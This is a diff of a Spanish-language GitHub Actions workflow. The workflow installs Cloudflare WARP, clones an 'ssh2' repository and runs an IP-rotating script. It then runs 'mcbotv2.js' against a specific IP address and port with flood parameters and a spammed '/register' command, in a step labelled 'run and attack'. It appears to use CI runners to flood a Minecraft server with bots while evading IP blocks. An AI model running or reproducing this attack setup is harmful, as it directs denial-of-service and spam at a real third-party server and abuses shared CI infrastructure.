@@ -8,21 +8,21 @@ jobs:
     timeout-minutes: 5
     
     steps:
-      - name: Instalar Cloudflare WARP
-        run: |
-          curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor -o /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg && echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list && sudo apt-get update -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y cloudflare-warp && (sudo systemctl enable warp-svc && sudo systemctl start warp-svc || sudo nohup warp-svc > /dev/null 2>&1 &) && sleep 3 && yes | sudo warp-cli --accept-tos registration new && sudo warp-cli --accept-tos connect && sudo warp-cli --accept-tos mode warp+doh
-          
       - name: Clonar repositorio
         run: |
           git clone https://github.com/Nekotina532/ssh2.git
           cd ssh2
           chmod +x change_ip.sh
           
+      - name: Instalar Cloudflare WARP
+        run: |
+          curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor -o /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg && echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list && sudo apt-get update -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y cloudflare-warp && (sudo systemctl enable warp-svc && sudo systemctl start warp-svc || sudo nohup warp-svc > /dev/null 2>&1 &) && sleep 3 && yes | sudo warp-cli --accept-tos registration new && sudo warp-cli --accept-tos connect && sudo warp-cli --accept-tos mode warp+doh
+          
       - name: Ejecutar change_ip.sh y atacar
         run: |
           cd ssh2
           ./change_ip.sh &
-           node mcbotv2.js 131.196.198.112 25575 13444 300 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
+          node mcbotv2.js 131.196.198.112 25575 13444 300 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
           
       - name: Limpiar
         if: always()
